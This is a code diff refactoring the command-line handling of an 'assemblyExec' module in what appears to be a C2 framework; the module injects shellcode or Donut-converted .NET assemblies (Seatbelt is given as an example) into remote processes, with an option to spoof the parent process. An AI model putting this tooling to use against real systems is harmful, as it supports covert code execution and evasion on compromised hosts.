@@ -1,10 +1,12 @@
 #include "AssemblyExec.hpp"
 
 #include <cstring>
+#include <iterator>
 #include <sstream>
 #include <chrono>
 #include <thread>
 
+#include "AssemblyExecCommandOptions.hpp"
 #include "Common.hpp"
 #include "Tools.hpp"
 
@@ -42,6 +44,10 @@ namespace
 {
     constexpr int ERROR_PROCESS_CREATION = 1;
 }
+
+#define modeThread "0"
+#define modeProcess "1"
+#define modeprocessWithSpoofedParent "2"
 
 
 #ifdef _WIN32
@@ -87,179 +93,143 @@ std::string AssemblyExec::getInfo()
     info += "Execute shellcode in a remote process (e.g., notepad.exe). Waits for execution to complete or until a 120-second timeout.\n";
     info += "Captures and returns any output produced by the shellcode.\n";
     info += "\nOptions:\n";
-    info += " -r <file>                  Use a raw shellcode file.\n";
-    info += " -e <exe> [args]            Use Donut to generate shellcode from a .NET executable.\n";
-    info += " -d <dll> <method> [args]  Use Donut to generate shellcode from a .NET DLL and specify method and arguments.\n";
-    info += "\nExecution Modes:\n";
-    info += " thread                      Inject and execute in a new thread\n";
-    info += " process                     Inject into a newly spawned process\n";
+    info += " --mode <mode> --raw <file>                 Execute raw shellcode.\n";
+    info += " --mode <mode> --donut-exe <exe> -- [args]  Execute Donut-generated shellcode from a .NET executable.\n";
+    info += " --mode <mode> --donut-dll <dll> --method <method> -- [args]\n";
+    info += "                                            Execute Donut-generated shellcode from a .NET DLL.\n";
+    info += "\nModes:\n";
+    info += " thread                    Inject and execute in a new thread\n";
+    info += " process                   Inject into a newly spawned process\n";
     info += " processWithSpoofedParent  Same as above, but with spoofed parent process\n";
     info += "\nExamples:\n";
-    info += " - assemblyExec thread\n";
-    info += " - assemblyExec process\n";
-    info += " - assemblyExec -r ./shellcode.bin\n";
-    info += " - assemblyExec -e ./program.exe arg1 arg2\n";
-    info += " - assemblyExec -e ./Seatbelt.exe -group=system\n";
-    info += " - assemblyExec -d ./test.dll MethodName arg1 arg2\n";
+    info += " - assemblyExec --mode process --raw ./shellcode.bin\n";
+    info += " - assemblyExec --mode thread --donut-exe ./Seatbelt.exe -- -group=system\n";
+    info += " - assemblyExec --mode process --donut-dll ./test.dll --method MethodName -- arg1 arg2\n";
 #endif
     return info;
 }
 
 
-#define modeThread "0"
-#define modeProcess "1"
-#define modeprocessWithSpoofedParent "2"
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
+namespace
+{
+std::string modeWireValue(const std::string& mode)
+{
+    const std::string normalized = assembly_exec_command::normalizeModeName(mode);
+    if (normalized == "thread")
+        return modeThread;
+    if (normalized == "processWithSpoofedParent")
+        return modeprocessWithSpoofedParent;
+    return modeProcess;
+}
+
+std::string readBinaryFile(const std::string& path)
+{
+    std::ifstream input(path, std::ios::binary);
+    return std::string(std::istreambuf_iterator<char>(input), std::istreambuf_iterator<char>());
+}
+} // namespace
+
+int AssemblyExec::initPreparedShellcode(const ModulePreparedShellcodeTask& task, C2Message& c2Message)
+{
+    if (task.payload.empty())
+    {
+        c2Message.set_returnvalue("Shellcode payload is empty.");
+        return -1;
+    }
+
+    std::string requestedMode = task.executionMode;
+    if (requestedMode.empty())
+    {
+        if (!m_isModeProcess)
+            requestedMode = "thread";
+        else if (m_isSpoofParent)
+            requestedMode = "processWithSpoofedParent";
+        else
+            requestedMode = "process";
+    }
+
+    const std::string mode = assembly_exec_command::normalizeModeName(requestedMode);
+    if (mode.empty())
+    {
+        c2Message.set_returnvalue("Unsupported execution mode.");
+        return -1;
+    }
+
+    c2Message.set_args(modeWireValue(mode));
+    c2Message.set_pid(-1);
+    c2Message.set_cmd(task.displayCommand);
+    c2Message.set_instruction(std::string(moduleName));
+    c2Message.set_inputfile(task.inputFile);
+    c2Message.set_data(task.payload.data(), task.payload.size());
+    return 0;
+}
+#endif
 
 
 int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS) || defined(C2CORE_BUILD_FUNCTIONAL_TESTS)
-    if(splitedCmd.size() == 2)
+    assembly_exec_command::CommandOptions options = assembly_exec_command::parseCommandOptions(splitedCmd);
+    if (!options.error.empty())
     {
-        if(splitedCmd[1]=="thread")
+        c2Message.set_returnvalue(options.error + "\n");
+        return -1;
+    }
+
+    if(options.modeOnly)
+    {
+        if(options.mode=="thread")
         {
             m_isModeProcess = false;
             c2Message.set_returnvalue("thread mode.\n");
             return -1;
         }
-        else if(splitedCmd[1]=="process")
+        if(options.mode=="process")
         {
             m_isModeProcess = true;
             m_isSpoofParent = false;
             c2Message.set_returnvalue("process mode.\n");
             return -1;
         }
-        else if(splitedCmd[1]=="processWithSpoofedParent")
+        if(options.mode=="processWithSpoofedParent")
         {
             m_isModeProcess = true;
             m_isSpoofParent = true;
             c2Message.set_returnvalue("process mode with parent spoofing.\n");
             return -1;
         }
-        else
-        {
-            c2Message.set_returnvalue(getInfo());
-            return -1;
-        }
     }
-    else if (splitedCmd.size() >= 3)
+
+    if (options.generator != "raw")
     {
-        bool donut=false;
-        std::string inputFile=splitedCmd[2];
-        std::string method;
-        std::string args;
-        int pid=-1;
-
-        if(splitedCmd[1]=="-e")
-        {
-            donut=true;
-            for (int idx = 3; idx < splitedCmd.size(); idx++) 
-            {
-                if(!args.empty())
-                    args+=" ";
-                args+=splitedCmd[idx];
-            }
-        }
-        else if(splitedCmd[1]=="-d")
-        {
-            donut=true;
-            if(splitedCmd.size() > 3)
-                method=splitedCmd[3];
-            else
-            {
-                std::string msg = "Method is mandatory for DLL.\n";
-                c2Message.set_returnvalue(msg);
-                return -1;
-            }
-            for (int idx = 4; idx < splitedCmd.size(); idx++) 
-            {
-                if(!args.empty())
-                    args+=" ";
-                args+=splitedCmd[idx];
-            }
-        }
-        else if(splitedCmd[1]=="-r")
-        {
-        }
-        else
-        {
-            std::string msg = "One of the tags, -r, -e or -d must be provided.\n";
-            c2Message.set_returnvalue(msg);
-            return -1;
-        }
-
-        if(inputFile.empty())
-        {
-            std::string msg = "A file name have to be provided.\n";
-            c2Message.set_returnvalue(msg);
-            return -1;
-        }
-
-        std::ifstream myfile;
-        myfile.open(inputFile, std::ios::binary);
-
-        if(!myfile)
-        {
-            std::string newInputFile=m_toolsDirectoryPath;
-            newInputFile+=inputFile;
-            myfile.open(newInputFile, std::ios::binary);
-            inputFile=newInputFile;
-        }
-
-        if(!myfile) 
-        {
-            std::string msg = "Couldn't open file.\n";
-            c2Message.set_returnvalue(msg);
-            return -1;
-        }
-        myfile.close();
-
-        std::string payload;
-        if(donut)
-        {
-            // if we create a process we need to exite process with donut shellcode
-            // Otherwise we exite the threadd
-            creatShellCodeDonut(inputFile, method, args, payload, true, false, m_windowsArch);
-        }
-        else
-        {
-            std::ifstream input(inputFile, std::ios::binary);
-            std::string payload_(std::istreambuf_iterator<char>(input), {});
-            payload=payload_;
-        }
-
-        if(payload.size()==0)
-        {
-            std::string msg = "Something went wrong. Payload empty.\n";
-            c2Message.set_returnvalue(msg);
-            return -1;
-        }
-
-        std::string cmd;
-        for (int idx = 1; idx < splitedCmd.size(); idx++) 
-        {
-            cmd+=splitedCmd[idx];
-            cmd+=" ";
-        }
-
-        if(m_isModeProcess == false)
-            c2Message.set_args(modeThread);
-        else if(m_isModeProcess == true && m_isSpoofParent == false)
-            c2Message.set_args(modeProcess);
-        else if(m_isModeProcess == true && m_isSpoofParent == true)
-            c2Message.set_args(modeprocessWithSpoofedParent);
-
-        c2Message.set_pid(pid);
-        c2Message.set_cmd(cmd);
-        c2Message.set_instruction(splitedCmd[0]);
-        c2Message.set_inputfile(inputFile);
-        c2Message.set_data(payload.data(), payload.size());
-    }
-    else
-    {
-        c2Message.set_returnvalue(getInfo());
+        c2Message.set_returnvalue("Donut shellcode generation is handled by the TeamServer shellcode service.\n");
         return -1;
     }
+
+    std::string inputFile = options.sourcePath;
+    std::ifstream myfile(inputFile, std::ios::binary);
+    if(!myfile)
+    {
+        std::string newInputFile=m_toolsDirectoryPath;
+        newInputFile+=inputFile;
+        myfile.open(newInputFile, std::ios::binary);
+        inputFile=newInputFile;
+    }
+
+    if(!myfile)
+    {
+        c2Message.set_returnvalue("Couldn't open file.\n");
+        return -1;
+    }
+    myfile.close();
+
+    ModulePreparedShellcodeTask task;
+    task.inputFile = inputFile;
+    task.payload = readBinaryFile(inputFile);
+    task.executionMode = options.mode;
+    task.displayCommand = options.displayCommand;
+    return initPreparedShellcode(task, c2Message);
 #endif
     return 0;
 }
